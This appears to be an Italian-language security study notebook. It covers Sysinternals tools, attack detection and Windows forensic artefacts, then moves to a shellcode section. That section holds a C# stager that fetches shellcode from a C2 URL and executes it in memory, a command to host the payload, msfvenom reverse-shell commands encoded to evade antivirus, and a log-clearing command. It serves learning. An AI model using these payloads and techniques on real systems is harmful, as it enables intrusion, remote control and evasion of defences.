      control.exe /name Microsoft.NetworkAndSharingCenter #comando per aprire il pannello per le connessioni di rete
<!-- -->
      Modifica Impostazioni di condivisione avanzate -> attivare Individuazioni di rete pubbliche #attivazione della seguente feature
<!-- -->
      \\live.sysinternals.com\tools\<nome eseguibile> #comando in powershell per aprire l'eseguibile da remoto
<!-- -->      

##### File e Dischi:

_Utilizzo di eseguibili per l'ispezione e la modifica di file e dischi_

1) SigCheck:

_Command line per la verifica di firme inerenti ad un file_

_Comandi:_
<!-- -->
      sigcheck -u -e C:\Windows\System32 -accepteula #comando per il controllo di file non firmati
<!-- -->
2) Streams:

_Eseguibile da command line che permette di vedere il contenuto degli ADS, esistono però dei comandi in powershell che permettono di visionarli, basta solo cliccare [qui](./#comandi-ads-alternate-data-stream)_

_Comandi:_ 
<!-- -->
      streams <path del file> -accepteula #comando per vedere il contenuto degli ADS
<!-- -->
3) SDelete:

_Tool per cancellare in maniera sicura un file_

_Comandi:_
<!-- -->
      sdelete <path del file> -p <num volte da cancellare> #comando per eliminare in maniera sicura
<!-- -->

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/file-and-disk-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Rete:

_Tool per il monitoraggio della rete_

1) TCPView:

_Eseguibile che se avviato da un'ottima visiona dei socket in ascolto o delle connessioni stabilite, molto potente se utilizzato con wireshark_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/networking-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Processi:

_Eseguibili che permettono il monitoraggio dei processi_

1) Autoruns:

_Utility per vedere quali programmi sono configurati per avviarsi quando si fa il login o al momento dell boot del pc_

2) ProcDump:

_Tool che permette di fare il dump dei processi per poi analizzare cosa è successo, è possibilie fare un fulldump o un minidump._

3) ProcessMonitor:

_Utility che permette di controllare i processi, che operazioni stanno facendo e cosa hanno modificato e il tutto è eseguito tramite dei filtri._

4) PSExec:

_Command line tool che permette di eseguire comandi da remoto, utilizzato per il [lateral movements](./#lateral-movements)._

5) PsService:

_Utility che permette di ricavare informazioni inerenti ai servizi_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/process-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Sicurezza:

_Eseguibili o command line che danno una visione di insieme sulla sicurezza del computer_

1) Sysmon:

_Agent per il monitoring degli endpoint che poi può essere integrato in un SIEM_

_Comandi:_
<!-- -->
      Sysmon.exe -accepteula -i <configurazione xml> #comando per avviare sysmon con una configurazione xml
<!-- -->
      Visualizzatore di eventi-> Registri applicazione e servizi-> Microsoft -> Windows -> Sysmon -> Operational #passi per vedere gli eventi registrati
<!-- -->
_Best Practices:_ 

1) escludere meglio di includere, perchè cosi si è si sicuri di non dimenticarsi qualche evento

2) Utilizzo della CLI quali Get-WinEvent o wevutil.exe

- __Rilevamento:__

_Piccola sezione dove viene appuntato come rilevare i tool più noti di pentesting_

- _Metasploit:_

_Una buona pratica per cercare l'utilizzo di metasploit è nelle connessioni aperte come la porta 4444 o 5555 per poi fare un'ulteriore ricerca su ProcessID e Image_

- _Mimikatz:_

_Il primo passo per rilevare la presenza di Mimikatz può essere nella ricerca di file creati dallo stesso software o che hanno il suo stesso nome, il secondo passo é nel controllo del LSASS, verificare da quali altri processi viene utilizzato e se vi è una numerosa presenza di svchost.exe può essere un campanello di allarme_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/security-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Informazioni di sistema:
_Tool per visionare informazioni di sistema_

1) winObj:

_Eseguibile utilizzato per vedere le informazioni degli oggetti NT_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_

##### Generali:

_Utilities per info generali sul sistema_

1) BgInfo:

_Utilizzato per scrivere le info generali sul pc avviato_

2) RegJump:

_Piccola utility che apre regedit e va direttamente al valore che si cerca_

_Comandi:_
<!-- -->
      regjump <path valore> -accepteula #comando per andare subito ad un valore  
<!-- -->
_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_

### Forense: 

_Sezione dedicata alla Forense in windows, sapere dove cercare è allo stesso tempo saper imparare per coprire le proprie tracce_

##### FAT e NTFS:

_Nel mondo della Forense è importante avere una visione d'insieme su dove noi andiamo a recuperare i dati, quindi conoscere i vari tipi di filesystems utilizzati da windows è importante e poi anche avere una sorta d'infarinatura generale non fa male_

- _FAT:_

_FAT (File Allocation Table) è una table ma più precisamente un lista collegata di __"cluster"__(L'unità di storage nel FAT), questa lista contiene lo stato dei cluster cioè se sono liberi o meno e inoltre i puntatori al prossimo cluster ed infine la grandezza totale del FAT è dato dal numero di bit utilizzati per indirizzare un cluster nella tabella_

_Esistono 4 tipi di FAT:_

1) FAT12 = 12 bit per cluster-> 2^12 = 4096 cluster indirizzabili-> 512B a 8KB di storage per cluster-> volume massimo supportato 32MB

2) FAT16 = 16 bit per cluster-> 2^16 = 65536 cluster indirizzabili-> 2KB a 32KB di storage per cluster-> volume massimo supportato 2GB

3) FAT32 = 28 bit per cluster-> 2^28 = 268,435,456 cluster indirizzabili-> 4KB a 32KB di storage per cluster-> volume massimo supportato 2TB

4) exFAT = 64 bit per cluster-> 2^64 = 18,446,744,073,709,551,616 cluster indirizzabili-> 32MB di storage per cluster-> volume massimo supportato 128P
   _Questo tipo di filesystem è utilizzato nelle memorie flash come schede SD_

- _NTFS:_

_NTFS (New Technology Filesystem) è il più recente filesystem sviluppato da microsoft e muta di molto rispetto al FAT, in primis già cambia per le dimensioni di storage supportate che sono molto di più, poi abbiamo il __"Journaling"__, cioè un log ($LOGFILE) che tiene traccia di tutte le modifiche ai metadati, abbiamo i controlli all'accesso i quali definiscono il proprietario di un file e i permessi dei vari utenti a quel file, abbiamo poi la possibilita dei backup con le shadow copies, l'[ADS](./#comandi-ads-alternate-data-stream), compressione e cifratura._

_NTFS piuttosto che avere la File Allocation Table dispone della __"Master File Table"__, una table più complessa rispetto al FAT è un database strutturato che tiene traccia degli oggetti immagazzinati, la __"MFT"__ possiede dei file importanti da un punto di vista forense e sono:_

1) $MFT = MFT è il primo record nel filesystem, contiene poi il VBR (Volume Boot Record) che punta al cluster del MFT infine MFT ha le informazioni sui cluster e quali oggetti contengono

2) $LOGFILE = file di log che registra le varie modifiche nel NTFS

3) $UsnJrnl = è anche chiamato change journal perchè tiene conto di tutte le modifiche apportate ai file e il motivo  si trova nel $Extent record

_Grazie al tool [MFT Explorer](https://ericzimmerman.github.io/#!index.md), andremo a visionare gli MFT files_

_Comandi:_
<!-- -->
     MFTECmd.exe -f <path di $MFT> --csv <path per salvare il csv> #comando di MFTECmd per analizzare il file $MFT
<!-- -->
##### Registri:

_La spiegazione di cosa sono e di quali sono i registri si trova [qui](./#register-keys)_

_Durante un'acquisizione forense, saremmo in possesso di una copia dell'immagine d'analizzare offline è quindi bene sapere dove e quali registri visionare.
La maggior parte dei registri sono collocati in __"C:\Windows\System32\Config"__ e sono:_

- DEFAULT (HKEY__USERS\DEFAULT)

- SAM (HKEY_LOCAL_MACHINE\SAM)

- SECURITY (HKEY_LOCAL_MACHINE\SECURITY)

- SOFTWARE (HKEY_LOCAL_MACHINE\SOFTWARE)

- SYSTEM (HKEY_LOCAL_MACHINE\SYSTEM)

_Vi sono poi ulteriori registri che contengono i dati e le informazioni dell'utente i quali sono:_

- NTUSER.DAT (HKEY_CURRENT_USER) e si trova alla directory (__"C:\Users\<nome user>\"__)

- USRCLASS.DAT (HKEY_CURRENT_USER\Software\CLASSES) e si trova alla directory (__"C:\Users\<nome user>\AppData\Local\Microsoft\Windows"__)

- __File cache, log e backups:__

_Altri file importanti sono quelli di cache, log e backups che generalmente possiamo trovare in:_

- Cache = C:\Windows\AppCompat\Programs\Amcache.hve file che salva dati sui programmati avviati

- Log = C:\Windows\System32\Config cartella dove possiamo trovare i file log dei registri principali salvati con l'estensione .LOG

- Backup = C:\Windows\System32\Config\RegBack cartella con i backup dei registri

- __Informazioni di sistema e account:__

- _Versione OS:_

_La versione dell'OS che stiamo analizzando è possibile verificarla alla path __"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"___

- _Current Control Set:_

_Il current control set è un registro che contiene i dati per la configurazione (Driver,servizi,hardware...) della macchina windows, ne esistono 3 e sono situtati in __"HKLM\SYSTEM"__: quando vi è il boot della macchina, windows crea un control set volatile chiamato __"HKLM\SYSTEM\CurrentControlSet"__,è infine possibile vedere la configurazione scelta alle path __"SYSTEM\Select\Current"__ e __"SYSTEM\Select\LastKnownGood"___

- _Nome computer:_

_Il nome del computer è possibile trovarlo nel registro __"HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"___

- _Fuso orario:_

_Nell'indagine Forense è bene capire qual'è il fuso orario è possiamo scroprirlo alla path __"HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"___

- _Interfaccie di rete:_

_Possiamo scoprire a quella interfaccia di rete si è connessi a questa path __"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"__ invece per le connessioni di rete passate si può andare qui __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged"__ e __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed"__ ogni rete sarà contrassegnata da un identificatore univoco __"GUID"___

- _Spegnimento del PC:_

_Alla seguente path __"HKLM\SYSTEM\CurrentControlSet\Control\Windows"__, possiamo verificare quando il pc è stato spento_

__N.B: Ogni versione di windows modifica la posizione di questo registro__

##### File:

- _File recenti:_

_La path dove poter visionare i file aperti in ordine di ultima modifica è __"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"__ e se vogliamo filtrare per estensione .txt basta aggiungere dopo __"\RecentDocs\.txt"__.

Possiamo fare un ulteriore indagine per i file office dove possiamo andare a vedereli qui:_

1) HKCU\Software\Microsoft\Office\VERSION

2) HCKU\Software\Microsoft\Office\<num versione>\Word

[link](https://docs.microsoft.com/en-us/deployoffice/install-different-office-visio-and-project-versions-on-the-same-computer#office-releases-and-their-version-number) alle versioni di office

3) HCKU\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU

_Un'altro modo per determinare il tipo di file aperto è tramite l lo __"ShellBag"__, cioè le impostazioni di preferenza del layout delle finestre che possono essere trovate alle seguenti path:_

1) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\Bags

2) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\BagMRU

3) HCKU\Software\Microsoft\Windows\Shell\BagMRU

4) HCKU\Software\Microsoft\Windows\Shell\Bags

__N.B: il tool [ShellBag explorer](https://ericzimmerman.github.io/#!index.md) può semplificarci la vita__

- _Box dialogo:_

_Alla seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"__ è possibile risalire a quale ultimo dialogo di box è stato utilizzato e quindi a quale file o applicazione l'ha chiamato_

- _Ricerche path:_

_Nei registri alle seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"__ possiamo ricavare le path ricercate dall'utente_

- _File prefetch:_

_Quando un programma in windows vienne avviato crea i file __"prefetch"__, file che raccolgono informazioni per usi futuri tipo caricare l'eseguibile in maniera più rapida; ritornano utili nella forense perchè registrano quante volte l'eseguibile viene aperto, quali file e handle sono utilizzati dall'eseguibile stesso e il tempo dell'ultimo utilizzo_

_Come al solito Eric Zimmerman metta a disposizione un tool chiamato [PECmd.exe](https://ericzimmerman.github.io/#!index.md) che serve a parsare e in seguito vedere i dati dei file .pf_

_Comandi:_
<!-- --> 
     PECmd.exe -f <path per i file prefetch> --csv <path per salvare il .csv> #comando per estrarre i dati dai file .pf e salvarli in un .csv
<!-- --> 
     PECmd.exe -d <path per la cartella> --csv <path per salvare il .csv> #comando per estrarre i dati da una cartella e salvarli in un .csv
<!-- --> 

- _Cestino:_

_Il cestino può essere un ottima fonte di informazioni per capire cosa è stato cancellato, lo si trova in __"C:\$Recycle.Bin"__, i file con __"$I######"__ contengono nome originale del file data di quando è stato cancellato mentre i file con __"$R######"__ contengono il contenuto.
Eric mette a disposizione un tool per visionarlo [RBCmd.exe](https://ericzimmerman.github.io/#!index.md)_

_File Cloud:_

_Possiamo reperire i dettagli degli account cloud di microsoft a questo percorso __"HKLM\AM\Domains\Account\Users\InternetUserName"__, InternetUserName contiene l'email dell'account_

##### Applicazioni:

- _UserAssist:_

_Windows tiene traccia delle applicazioni lanciate, il tempo trascorso, e il numero di volte aperto e lo fa per ragioni di statistica però a noi può tornare utile, infatti andando a questo path __"HKCU\\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\<GUID>\Count"__ è possibile visionarle_

- _ShimCache:_

_La ShimCache è un meccanismo che tiene traccia della compatibilità delle applicazioni con l'OS e quando queste vengono lanciate è possibile visionare le info a questa path __"HKLM\SYSTEM\urrentControlSet\Control\Session Manager\AppCompatCache"__ ma per avere una visione migliore dei dati possiamo utilizzare il tool __"[AppCompatCacheParser](https://ericzimmerman.github.io/#!index.md)"__ per creare il .csv con i dati ed infine visionarli con il tool __"[EZViewer](https://ericzimmerman.github.io/#!index.md)"___

_Comandi:_
<!-- -->
      AppCompatCacheParser.exe --csv <file output> -f <path del registro SYSTEM> -c <controlset> #comando per creare il .csv
<!-- -->      
- _AmCache:_

_AmCache è sempre ricollegabile a ShimCache, in quanto entrambi raccolgono dati sulle applicazioni però AmCache, inoltre immagazzina dati come: path, tempo di esecuzione, SHA1 hash dei programmi eseguiti ecc...
Possiamo visionarlo alle seguenti path __"C:\Windows\appcompat\Programs\Amcache.hve"__ dobve è il file .hve e se utilizziamo Registry explorer troviamo l'ultimi programmi eseguiti a questa path __"Amcache.hve\Root\File\<Volume GUID>\"___

- _BAM/DAM:_

_BAM è il background activity monitor, colui che monitora le applicazioni in background mentre DAM è Desktop Activity Moderator colui addetto all'ottimizazione dei consumi del device, entrambi i meccanismi tengono conto delle informazioni riguardanti le ultime applicazioni runnate e possiamo visionarle alle seguenti path __"HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\<SID>"__ e __"HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings\<SID>"___

- _Windows 10 timeline:_

_Windows 10 registra le applicazioni utilizzate di recente in un sqlite database chiamato __"Windows 10 Timeline"__ e si trova alla seguent path __"C:\Users\<nome utente>\AppData\Local\ConnectedDevicesPlatform\<cartella casuale>ActivitiesCache.db"__ e tramite il tool [WxTCmd.exe](https://ericzimmerman.github.io/#!index.md) possiamo vederlo_

_Comandi:_
<!-- --> 
     WxTCmd.exe -f <path al file timeline> --csv <path per salvare il csv> #comando che dato il file timeline estrae i dati e li salva in un .csv
<!-- -->

- _Task Bar:_

_Possiamo reperire dal seguente registro __"HCKU\Software\CLASSES\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage"__ e più specificatamente alle due subkey __"AppLaunch (registra solo le applicazioni aggiunge alla taskbar)"__ e __AppSwitched (conta il numero  delle volte che l'utente interagisce con un'applicazione)__ le applicazioni con cui interagisce l'utente però vi sono delle limitazioni: il registro tiene conto solo dei software con GUI e non vi sono informazioni sul timestamp_

- _Windows jump lists:_

_le windows jump lists vennero introdotte per aiutare gli utenti ad accedere in maniera più diretta ai file utilizzati di recente è possibile visionarle alla seguente path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"__, tramie il tool [JLECmd.exe](https://ericzimmerman.github.io/#!index.md)_

_Comandi:_
<!-- --> 
     JLECmd.exe -f <path alla jumplist file> --csv <path per salvare il csv> #comando che prende i dati da un jumplist file e li salva in un .csv
<!-- --> 
- _Collegamenti:_

_I collegamenti, contengono informazioni sulla prima e ultima apertura di un file, la path del file o eseguibile ed è possibile visionarli alle seguenti path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\"__ e __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Office\Recent\"__ e come al solito abbiamo il tool per visionarlo il quale è [LECmd.exe](https://ericzimmerman.github.io/#!index.md)_

- _Comandi:_
<!-- --> 
      LECmd.exe -f <path agli shortcut file> --csv <path per salvare il .csv> #comando che dato uno shortcut file crea un .csv con i dati
<!-- --> 

- _MRU (Most Recent Used):_

_MRU tiene traccia delle applicazione utilizzate dall'utente e della posizione della cartella dell'ultimo file a cui l'applicazione ha acceduto è possibile visualizzarlo alla seguente path __HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU___

_Inoltre sempre tramite MRU è possibile tenere traccia dei file aperti o salvati all'interno di una finestra di dialogo, path: __"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU"___

- _CapabilityAccessManager:_

_Qui viene registrato l'uso del microfono, fotocamera e altre impostazioni, possiamo vederlo a queste path: __"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"__ e __"HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore"___

##### Log:

_Il conoscere quali sono e dove andare a vederli è importante per avere un quadro generale su cosa è successo ad una macchina_

_Possiamo riconoscre i file di log perchè sono salvati con l'estensioni __".evt"__ o __".evtx"__ e li troviamo tipicamente alla path __"C:\Windows\System32\winevt\Logs"___

- _Event Viewer:_

_event viewer è il software integrato in windows che permette la visione dei log, lo stesso software divide i log in diversi gruppi per semplificarne la ricerca e visualizzazione, le tipologia sono:_

1) Log di sistema = Log del sistema operativo windows

2) Log di sicurezza = Log inerenti al logon e logoff nel device o i diversi eventi di sicurezza

3) Log applicazioni = Log delle applicazioni quando vi sono eventi, crash o warnings

4) Directory Service Events = Log dell'Active Directory più specificatamente per i domain controller

5) Log di DNS = Log per gli eventi DNS

6) Log personalizzati = Log utilizzati dalle applicazioni che richiedono più memoria

- _wevutil.exe:_

_wevutil.exe o Windows Events Commandline Utility permette di automatizzare il processo di visionare le miriade di log presenti in un PC con diverse tipologia di commandi_

_Comandi:_
<!-- --> 
     wevutil.exe export-log <tipologia di eventi> <path dove salvare in .XML> #comando per esportare un file log
<!-- --> 
     wevutil.exe query-log <tipologia di eventi> --filter "<filtro query>" --output-format:xml #comando per fare una query su una tipologia di eventi
<!-- --> 
     wevutil.exe clear-log <tipologia di eventi> #comando che permette di ripulire una tipologia di eventi
<!-- --> 
     wevutil.exe get-log <tipologia di eventi> #comando per ottenere maggiori info su una tipologia di eventi
<!-- --> 
     wevtutil.exe set-log <tipologia di eventi> /level:<tipologia di registrazione> /maxsize:<dimensione log> #comando che imposta alcune opzioni su una data tipologia di eventi
<!-- --> 
- _Get-WinEvent:_

_Comando powershell che permette di automatizzare il processo di visione dei log_

- _Comandi:_
<!-- --> 
      Get-WinEvent -ListLog * #comando che recupera tutti i log
<!-- --> 
      Get-WinEvent -ListProvider * #comando che recupera i nome dei provider dei log
<!-- --> 
      Get-WinEvent -LogName <nome> | Where-Object { $_.ProviderName -Match 'WSMan' } #comando che filtra i log
<!-- --> 
- _XPath:_

_XPath (XML Path Language) è un linguaggio per navigare ed interrogare i documenti scritti in XML_

_Quando si utilizza Event Viewer cliccando su evento, poi andando in dettagli e cliccando XML potremmo notare il medesimo evento scritto in XML e potrà essere utilizzato per le nostre XPath queries_

ES:
<!-- --> 
	- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">  #Event o * indica l'inizio del XML
	- <System>`  #campo utilizzato per il filtraggio dei parametri dentro Systenm
	  <Provider Name="HP Comm Recovery" /> #campo per il filtraggio tramite nome del Provider Name
	  <EventID Qualifiers="0">1</EventID>  #campo per il filtraggio nel comando tramite il numero dell'event ID
	  <Version>0</Version> 
	  <Level>4</Level> 
	  <Task>0</Task> 
	  <Opcode>0</Opcode> 
	  <Keywords>0x80000000000000</Keywords> 
	  <TimeCreated SystemTime="2023-08-31T20:03:39.3352531Z" /> 
	  <EventRecordID>7684</EventRecordID> 
	  <Correlation /> 
	  <Execution ProcessID="5884" ThreadID="0" /> 
	  <Channel>Application</Channel> 
	  <Computer>alessandro</Computer> 
	  <Security /> 
	  </System>
	- <EventData> #campo utilizzato per il filtraggio dei parametri dentro EventData
	  <Data>Resume from Connected Standby</Data> 
	  </EventData>
	  </Event>`
<!-- --> 
_Comando esempio XPath dall'evento xml sopra:_
<!-- --> 
	Get-WinEvent -LogName <tipologia nome evento> -FilterXPath '*/System/EventID=<num evento> or /Provider[@Name="<nome provider>"]'
<!-- --> 
_Un ottimo programma di logging è [Sysmon](./#sicurezza), preinstallato in windows_

##### Device Esterni:

- _USB:_

_Tramite i registri è possibile risalire a diverse informazioni inerenti i device USB alle seguenti path:_

1) HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR o \USB è possibile reperire ID vendor, ID prodotto, versione USB

2) SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\<id usb>\---- al posto dei __"----"__ possono esserci i numeri 0064 (Tempo prima connessione), 0066(tempo ultima connessione) e 0067 (tempo ultima rimozione)

3) HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices qui possiamo trovare i nomi

_Possiamo reperire anche alla seguente path __"C:\Windows\inf\setupapi.dev.log"__ diverse informazioni sul device USB_
   
##### Tools:

_Parte fondamentale nella forense oltre a chi investiga, lo sono i tool quali:_

_Acquisizione:_

- [FTKImager](https://www.exterro.com/ftk-imager)

- [Autopsy](https://www.autopsy.com/)

_Generali:_

- [Tool Eric Zimmerman's](https://ericzimmerman.github.io/#!index.md)

- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape)

__N.B: I tool sviluppati da Eric Zimmerman's sono gratuti e molto utili__

### Shellcode:

_Shellcode è un'insieme di istruzioni macchina volte nella maggior parte dei casi ad ottenere una shell privilegiata o una revshell, viene utilizzato in payload malevoli, in exploit e negli stessi malware._

- __Esempio di shellcode:__

_Il nostro primo shellcode, non è altro che una stringa che compare a schermo e poi esce dal programma_

_Codice:_
<!-- --> 
      global _start

      section .text
      _start:
        jmp MESSAGE #inizio del programma che salta a message

     GOBACK:
        mov rax, 0x1 #istruzione che carica il valore 1 nel registro RAX (utilizzato per specificare le syscall) indicando write
        mov rdi, 0x1 #istruzione che il valore 1 nel registro RDI (utilizzato per il file descriptor) 1 è uguale a quello di output
        pop rsi  #istruzione che toglie l'indirizzo di goback e lo salva nel registro RSI
        mov rdx, 0xd #istruzione che carica il valore 13 nel registro RDX (utilizzato per definire la lunghezza dei dati)
        syscall #istruzione che effettua la syscall write

        mov rax, 0x3c #istruzione che copia il valore 60 nel registro RAX (60 è uguale a exit)
        mov rdi, 0x00 #istruzione che carica il valore 0 nel registro RDI che specifica l'uscita senza errori
        syscall #istruzione che effetua la syscall exit

     MESSAGE:
        call GOBACK #chiamata alla funzione Goback quindi              
        db "Hello World!", 0dh, 0ah #istruzione che definisce dei byte (define bytes) con la stringa 0dh = \r oah = \n
<!-- --> 
_Comandi:_
<!-- --> 
      nasm -f elf64 <nome script>asm #comando per compilare lo script
<!-- --> 
      ld <nome eseguibile>o -o <nome eseguibile> #comando per linkare e preparare l'eseguibile
<!-- --> 
      ./<nome eseguibile> #comando per eseguirlo
<!-- --> 
      objcopy -j .text -O binary <nome eseguibile> <nome testo>.text #comando per estrarre .text section in binario
<!-- --> 
      xxd -i <nome testo>.text #comando per cambiare il binario in esadecimale
<!-- --> 
_Ora basterà prendere l'array di byte in C e inserirlo in un semplice programma per vedere che il tutto funzionerà_

- _Generazione di shellcode:_

_Esistono diversi C2 o lo stesso [metasploit](./#metasploit) che permettono di generare degli shellcode in maniera automatica_

_Comandi:_
<!-- --> 
       msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c #comando che genera uno shellcode di una calcolatrice in C
<!-- --> 
       msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw #comando che genera uno shellcode di una calcolatrice in formato raw
<!-- --> 
- _Stageless vs Staged:_

_Un payload stageless, significa che il payload stesso ha tutto in un solo eseguibile e quindi si avvierà subito_

_Vantaggi:_

1) Il payload verrà eseguito senza aprire ulteriori connessioni di rete quindi meno interazioni meno sono le possibilità di essere rilevati

2) Nel caso di internet lento non c'è problema, l'intero payload funzionerà da un solo eseguibile che si trova sulla macchina target.

_Un payload Staged invece all'inizio dell'attaco manda un piccolo payload alla target machine, il payload di seguito ricontatta di solito il C2 che tiene il resto del payload malevolo_

_Vantaggi:_

1) poche traccie sul disco in quanto abbiamo solo il payload inziale mentre il resto del payload va in RAM, andando in RAM quindi vi è meno probabilità di essere rintracciati da AV

2) si può riutilizzare lo stesso payload per altri attachi

__N.B: Metasploit permette di crearli, per vedere come andare [qui](./#metasploit)__

- _Esempio di stager:_
<!-- --> 
     using System;
     using System.Net; 
     using System.Text;
     using System.Runtime.InteropServices;
     using System.Configuration.Install
     #importing delle librerie

     public class program {
      [DllImport("kernel32")]
      private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
      #codice per importare la funzione VirtualAlloc, serve a riservarci uno spazio di memoria per il nostro stager

      [DllImport("kernel32")]
      private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref 
      UInt32 lpThreadId);
      #codice per importare la funzione CreateThread, serve a creare un thread per il nostro processo

      [DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
      #codice per importare la funzione WaitForSingleObject, serve per la sincronizzazione tra thread

      private static UInt32 MEM_COMMIT = 0x1000;
      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

      WebClient wc = new WebClient(); #creazione dell'oggeto webclient che permette le connessione con il nostro C2
      ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; #comando per accettare il certificato self-signed
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; #comando che stabilisce il tipo di protocollo

      public static void main(){
      string url = "<url del C2>";
      stager(); #comando per passare alla seconda funzione
      }

      public static void stager(){

      byte[] shellcode = wc.DownloadData(url); #comando per fare il download dei dati passandogli l'url
      UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      #comando che alloca memoria per il nostro shellcode
  
      0 #indica l'indirizzo inziale di memoria dove allocare lo shellcode, con 0 indica che SO può fare autonomamente
      (UInt32)shellcode.Length #indica la grandezza di memoria d'allocare
      MEM_COMMIT #indica di riservare della memoria
      PAGE_EXECUTE_READWRITE #permessi di accesso alla memoria in questo caso execute read e write

      Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length); #comando che copia il payload nella memoria allocata codeAddr

      IntPtr threadHandle = IntPtr.Zero; #linea che inizializza una variabile di nome threadHandle, IntPtr.Zero rappresenta un handle dei thread
      UInt32 threadId = 0; #identificatore del thread
      IntPtr parameter = IntPtr.Zero; #paramtro nullo
      threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); #comando che crea un thread all'interno del processo corrente

      0 = primo parametro indica un comportamento del thread ma a zero non succede nulla
      0 = secondo parametro dimensione del thread ma a zero fa in automatico SO
      codeAddr = terzo parametro che indica l'indirizzo dove è presente il codice del thread da eseguire
      parameter = quarto parametro è vuoto
      0 = quinto parametro che settato a 0 indica che il thread deve iniziare subito
      threadId = sesto paramtro id del thread

      WaitForSingleObject(threadHandle, 0xFFFFFFFF); #comando che segnala il periodo di attesa al programma

      threadHandle = primo parametro che è l'handle influenzato
      0xFFFFFFFF = secondo parametro periodo d'attesa che essendo a FFFFFFFF, il programma deve attendere finchè il thread non finisca
        }
      }
<!-- --> 
_Comandi:_
<!-- --> 
      openssl req -new -x509 -keyout <nome certificato>.pem -out localhost.pem -days 365 -nodes #comando per generare certificato ssl/tls
<!-- --> 
      python3 -c "import http.server, ssl;server_address= ('<ip>',<porta>);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='<nome certificato>.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
      #comando per avviare un python server con protocollo https è dove vi sarà il resto del payload
<!-- --> 
- _Encoding e Encryption:_

_Encoding e Encryption vengono applicate ad uno shellcode per obfuscarlo, in modo che non sia del tutto in chiaro e rilevabile dagli AV, [Metasploit](./#metasploit) mette a disposizione dei moduli per le 2 tecniche_

_Comandi:_
<!-- -->
      msfvenom --list encoders | grep excellent #comando per greppare gli encoders con rating excellent
<!-- -->
      msfvenom -a x86 --platform Windows LHOST=<ip> LPORT=<porta> -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
      #comando per generare una revshell in C# encodato
<!-- -->
      msfvenom --list encrypt #comando per listare i vari metodi di encryption
<!-- -->
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<porta> -f exe --encrypt xor --encrypt-key "<chiave decriptazione>" -o <nome 
      eseguibile>.exe #comando che genera una revshell criptata
<!-- -->
- _Packers:_

_Il packing è utilizzato dagli sviluppatori per evitare che ad un loro programma venga fatto il reverse enginering e lo fanno tramite l'aggiunta di protezione contro il debbuging_

